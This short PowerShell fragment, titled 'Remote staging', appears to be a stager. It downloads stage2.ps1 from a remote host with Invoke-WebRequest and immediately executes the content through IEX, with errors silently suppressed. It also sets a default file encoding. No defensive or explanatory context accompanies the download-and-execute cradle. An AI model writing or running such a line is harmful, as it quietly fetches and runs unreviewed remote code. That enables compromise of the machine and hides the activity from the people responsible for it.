# Remote staging
IEX (Invoke-WebRequest -Uri "https://internal.corp/stage2.ps1" -UseBasicParsing -ErrorAction SilentlyContinue).Content
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
